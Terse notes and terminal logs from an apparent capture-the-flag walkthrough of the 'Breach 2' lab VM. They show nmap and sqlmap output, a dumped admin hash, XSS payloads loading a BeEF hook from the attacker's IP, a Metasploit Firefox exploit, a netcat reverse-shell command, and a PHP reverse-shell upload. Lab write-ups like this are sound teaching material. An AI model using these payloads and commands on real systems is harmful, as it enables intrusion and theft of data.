@@ -1,0 +1,400 @@
+└─$ nmap -sSCV -p 111,36827,65535 192.168.110.151
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 00:40 PDT
+Nmap scan report for 192.168.110.151
+Host is up (0.00076s latency).
+
+PORT      STATE SERVICE VERSION
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          36827/tcp   status
+|   100024  1          40250/udp   status
+|   100024  1          42946/udp6  status
+|_  100024  1          43945/tcp6  status
+36827/tcp open  status  1 (RPC #100024)
+65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 (DSA)
+|   2048 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 (RSA)
+|   256 c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 (ECDSA)
+|_  256 3b:4d:56:37:5e:c3:45:75:15:cd:85:00:4f:8b:a8:5e (ED25519)
+MAC Address: 08:00:27:75:5E:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+└─$ ssh root@192.168.110.151 -p 65535
+The authenticity of host '[192.168.110.151]:65535 ([192.168.110.151]:65535)' can't be established.
+ED25519 key fingerprint is SHA256:WSPZzGZPdZTVSHsFqYGt5lN1jqIM3ONgy68WbaOlZQk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.110.151]:65535' (ED25519) to the list of known hosts.
+ 
+#############################################################################
+#                  Welcome to Initech Cyber Consulting, LLC                 #
+#	          All connections are monitored and recorded                #
+#	              Unauthorized access is encouraged                     #
+#	      Peter, if that's you - the password is in the source.         #
+#          Also, stop checking your blog all day and enjoy your vacation!   # 
+#############################################################################
+
+
+//ssh peter, use passwd: inthesource , like knock port
+└─$ ssh peter@192.168.110.151 -p 65535
+  #############################################################################
+#                  Welcome to Initech Cyber Consulting, LLC                 #
+#	          All connections are monitored and recorded                #
+#	              Unauthorized access is encouraged                     #
+#	      Peter, if that's you - the password is in the source.         #
+#          Also, stop checking your blog all day and enjoy your vacation!   # 
+#############################################################################
+peter@192.168.110.151's password: 
+Permission denied, please try again.
+peter@192.168.110.151's password: 
+Connection to 192.168.110.151 closed.
+                                                                                                    
+┌──(ed㉿kali)-[~]
+└─$ nmap -p- 192.168.110.151          
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 00:57 PDT
+Nmap scan report for 192.168.110.151
+Host is up (0.000059s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+36827/tcp open  unknown
+65535/tcp open  unknown
+MAC Address: 08:00:27:75:5E:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+//we got 80 port open, wtf 
+[00:58:53] 403 -  304B  - /.htaccess.bak1
+[00:58:53] 403 -  304B  - /.htaccess.save
+[00:58:53] 403 -  306B  - /.htaccess.sample
+[00:58:53] 403 -  305B  - /.htaccess_extra
+[00:58:53] 403 -  304B  - /.htaccess_orig
+[00:58:53] 403 -  302B  - /.htaccessBAK
+[00:58:53] 403 -  302B  - /.htaccess_sc
+[00:58:53] 403 -  302B  - /.htaccessOLD
+[00:58:53] 403 -  294B  - /.htm
+[00:58:53] 403 -  303B  - /.htaccessOLD2
+[00:58:53] 403 -  295B  - /.html
+[00:58:54] 403 -  300B  - /.htpasswds
+[00:58:54] 403 -  304B  - /.htpasswd_test
+[00:58:54] 403 -  301B  - /.httr-oauth
+[00:58:54] 403 -  294B  - /.php
+[00:58:54] 403 -  295B  - /.php3
+[00:59:01] 301 -  317B  - /blog  ->  http://192.168.110.151/blog/
+[00:59:01] 200 -    1KB - /blog/
+[00:59:06] 403 -  297B  - /images/
+[00:59:06] 301 -  319B  - /images  ->  http://192.168.110.151/images/
+
+
+ sqlmap -u http://192.168.110.151/blog/login.html  --forms --dbs 
+    [23:25:02] [INFO] the back-end DBMS is MySQL
+    web server operating system: Linux Debian 8 (jessie)
+    web application technology: Apache 2.4.10
+    back-end DBMS: MySQL >= 5.0.12
+    [23:25:02] [INFO] fetching database names
+    available databases [5]:
+    [*] blog
+    [*] information_schema
+    [*] mysql
+    [*] oscommerce
+    [*] performance_schema
+
+sqlmap -u http://192.168.110.151/blog/index.php?search= --dbs -D oscommerce --tables --dump
+
+available databases [5]:
+[*] blog
+[*] information_schema
+[*] mysql
+[*] oscommerce
+[*] performance_schema
+
+[23:35:19] [INFO] fetching tables for database: 'oscommerce'
+Database: oscommerce
+[57 tables]
++-------------------------------------------+
+| osc_address_book                          |
+| osc_administrators                        |
+| osc_administrators_access                 |
+| osc_administrators_log                    |
+| osc_banners                               |
+| osc_banners_history                       |
+| osc_categories                            |
+| osc_categories_description                |
+| osc_configuration                         |
+| osc_configuration_group                   |
+| osc_counter                               |
+| osc_countries                             |
+| osc_credit_cards                          |
+| osc_currencies                            |
+| osc_customers                             |
+| osc_geo_zones                             |
+| osc_languages                             |
+| osc_languages_definitions                 |
+| osc_manufacturers                         |
+| osc_manufacturers_info                    |
+| osc_newsletters                           |
+| osc_newsletters_log                       |
+| osc_orders                                |
+| osc_orders_products                       |
+| osc_orders_products_download              |
+| osc_orders_products_variants              |
+| osc_orders_status                         |
+| osc_orders_status_history                 |
+| osc_orders_total                          |
+| osc_orders_transactions_history           |
+| osc_orders_transactions_status            |
+| osc_product_attributes                    |
+| osc_products                              |
+| osc_products_description                  |
+| osc_products_images                       |
+| osc_products_images_groups                |
+| osc_products_notifications                |
+| osc_products_to_categories                |
+| osc_products_variants                     |
+| osc_products_variants_groups              |
+| osc_products_variants_values              |
+| osc_reviews                               |
+| osc_sessions                              |
+| osc_shipping_availability                 |
+| osc_shopping_carts                        |
+| osc_shopping_carts_custom_variants_values |
+| osc_specials                              |
+| osc_tax_class                             |
+| osc_tax_rates                             |
+| osc_templates                             |
+| osc_templates_boxes                       |
+| osc_templates_boxes_to_pages              |
+| osc_weight_classes                        |
+| osc_weight_classes_rules                  |
+| osc_whos_online                           |
+| osc_zones                                 |
+| osc_zones_to_geo_zones                    |
++-------------------------------------------+
+
+//we got, but not fit for the login page
+admin 
+685cef95aa31989f2edae5e055ffd2c9	md5	32admin
+//and from sqlmap we found 
+[23:23:21] [WARNING] GET parameter 'search' does not appear to be dynamic
+[23:23:21] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
+[23:23:21] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
+
+<script src="http://192.168.110.105:3000/hook.js"></script>
+
+	
+<img src="http://192.168.110.105:8821" />
+
+WKAzXCUM0Sh9hWT1UX6KxCy7KuQUVVf8VNvZjeUhjB8CBm2vqnBPk6qlYaMPRJJNhBhtu1f7P08Eg85j
+
+/we got the session, and found cookie and the browser verison 15.0 firefox , pretty old.
+
+msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set payload firefox/shell_reverse_tcp 
+payload => firefox/shell_reverse_tcp
+msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set lhost 192.168.110.105
+lhost => 192.168.110.105
+msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set lport 8822
+lport => 8822
+msf6 exploit(multi/browser/firefox_proto_crmfrequest) > exploit 
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/browser/firefox_proto_crmfrequest) > 
+[*] Started reverse TCP handler on 192.168.110.105:8822 
+[*] Using URL: http://192.168.110.105:8080/meAl65eeh
+
+
+http://192.168.110.105:8080/0H1eCPN4Awwyf8
+
+nc 192.168.110.105 8821 -e /bin/bash
+
+─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [192.168.110.105] from (UNKNOWN) [192.168.110.151] 51583
+id
+uid=1000(peter) gid=1000(peter) groups=1000(peter),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(scanner),115(bluetooth),1003(fishermen)
+python -c "import pty;pty.spawn('/bin/bash')"
+peter@breach2:~$ pwd
+
+
+peter@breach2:~$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash192.168.110.151
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+messagebus:x:104:109::/var/run/dbus:/bin/false
+avahi:x:105:110:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+Debian-exim:x:106:112::/var/spool/exim4:/bin/false
+statd:x:107:65534::/var/lib/nfs:/bin/false
+colord:x:108:116:colord colour management daemon,,,:/var/lib/colord:/bin/false
+geoclue:x:110:117::/var/lib/geoclue:/bin/false
+rtkit:x:113:121:RealtimeKit,,,:/proc:/bin/false
+saned:x:114:122::/var/lib/saned:/bin/false
+usbmux:x:115:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+Debian-gdm:x:116:123:Gnome Display Manager:/var/lib/gdm3:/bin/false
+peter:x:1000:1000:peter,,,:/home/peter:/bin/bash
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:112:125:MySQL Server,,,:/nonexistent:/bin/false
+blumbergh:x:1001:1001::/home/blumbergh:/bin/false
+milton:x:1002:1002::/home/milton:/bin/bash
+
+
+peter@breach2:~$ telnet 127.0.0.1 2323
+telnet 127.0.0.1 2323
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+29 45'46" N 95 22'59" W 
+
+breach2 login: milton
+milton
+Password: Houston
+
+Last login: Tue Apr 29 12:05:37 EDT 2025 from localhost on pts/1
+Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
+29 45'46" N 95 22'59" W 
+3
+2
+1
+Whose stapler is it?
+mine
+Woot!
+milton@breach2:~$ id
+id
+uid=1002(milton) gid=1002(milton) groups=1002(milton)
+milton@breach2:~$ 
+
+
+  peter@breach2:/home/milton$ grep -rl stapler /usr/local 2>/dev/null
+  grep -rl stapler /usr/local 2>/dev/null
+  /usr/local/bin/cd.py
+  peter@breach2:/home/milton$ ls -la /usr/local/bin/cd.py
+  ls -la /usr/local/bin/cd.py
+  -rwxr-xr-x 1 milton milton 380 Jun 29  2016 /usr/local/bin/cd.py
+  peter@breach2:/home/milton$ cat /usr/local/bin/cd.py
+  cat /usr/local/bin/cd.py
+  #!/usr/bin/python
+
+  import signal
+  import time
+  import os
+
+  s = signal.signal(signal.SIGINT, signal.SIG_IGN)
+
+  countdown=3
+
+  while countdown >0:
+    time.sleep(1)
+    print(countdown)
+    countdown -=1
+  if countdown <1:
+    question = raw_input("Whose stapler is it?")
+  if question == "mine":
+    os.system("echo 'Woot!'")
+  else:
+
+    os.system("kill -9 %d"%(os.getppid()))
+    signal.signal(signal.SIGINT, s)
+
+cat .profile
+# ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+
+# the default umask is set in /etc/profile; for setting the umask
+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+    # include .bashrc if it exists
+    if [ -f "$HOME/.bashrc" ]; then
+	. "$HOME/.bashrc"
+    fi
+fi
+
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+    PATH="$HOME/bin:$PATH"
+fi
+
+python /usr/local/bin/cd.py
+sudo /etc/init.d/nginx start &> /dev/null
+
+sudo() {
+	echo "Sorry, user milton may not run sudo on breach2."
+}
+readonly -f sudo
+
+milton@breach2:/var/www/html2$ ss -pantu
+ss -pantu
+Netid  State      Recv-Q Send-Q     Local Address:Port       Peer Address:Port 
+udp    UNCONN     0      0                      *:1000                  *:*     
+udp    UNCONN     0      0                      *:5353                  *:*     
+udp    UNCONN     0      0              127.0.0.1:1010                  *:*     
+udp    UNCONN     0      0                      *:40705                 *:*     
+udp    UNCONN     0      0                      *:59918                 *:*     
+udp    ESTAB      0      0        192.168.110.151:54287      192.168.72.2:53    
+udp    UNCONN     0      0                      *:111                   *:*     
+udp    UNCONN     0      0                     :::40102                :::*     
+udp    UNCONN     0      0                     :::1000                 :::*     
+udp    UNCONN     0      0                     :::5353                 :::*     
+udp    UNCONN     0      0                     :::47203                :::*     
+udp    UNCONN     0      0                     :::111                  :::*     
+tcp    LISTEN     0      128                    *:8888                  *:*     
+tcp    LISTEN     0      128                    *:32858                 *:*     
+tcp    LISTEN     0      128                    *:65535                 *:*     
+tcp    LISTEN     0      50             127.0.0.1:3306                  *:*     
+tcp    LISTEN     0      128                    *:111                   *:*     
+tcp    LISTEN     0      64             127.0.0.1:2323                  *:*     
+tcp    ESTAB      0      0        192.168.110.151:58077   192.168.110.105:8821  
+tcp    ESTAB      0      0              127.0.0.1:60570         127.0.0.1:2323  
+tcp    ESTAB      0      0              127.0.0.1:2323          127.0.0.1:60570 
+tcp    CLOSE-WAIT 1      0        192.168.110.151:54781   192.168.110.105:3000  
+tcp    ESTAB      0      0        192.168.110.151:57325   192.168.110.105:8822  
+tcp    LISTEN     0      128                   :::8888                 :::*     
+tcp    LISTEN     0      128                   :::45311                :::*     
+tcp    LISTEN     0      128                   :::111                  :::*     
+tcp    LISTEN     0      128                   :::80                   :::*    
+
+//got port 8888 is listening, as we found html2 folder, It might be another web service
+//after visit 8888, we navigated to /admin, but admin/32admin did not work her, admin/admin worked...
+//file management tool, with includes/work/ we have write privi, so we upload php revers shell.
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [192.168.110.105] from (UNKNOWN) [192.168.110.151] 58185
+Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux
+ 10:42:13 up  3:10,  1 user,  load average: 0.19, 0.20, 0.17
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+milton   pts/1    localhost        09:54   12:50   0.01s  0.01s -bash
+uid=1001(blumbergh) gid=1001(blumbergh) groups=1001(blumbergh),1004(fin)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(blumbergh) gid=1001(blumbergh) groups=1001(blumbergh),1004(fin)
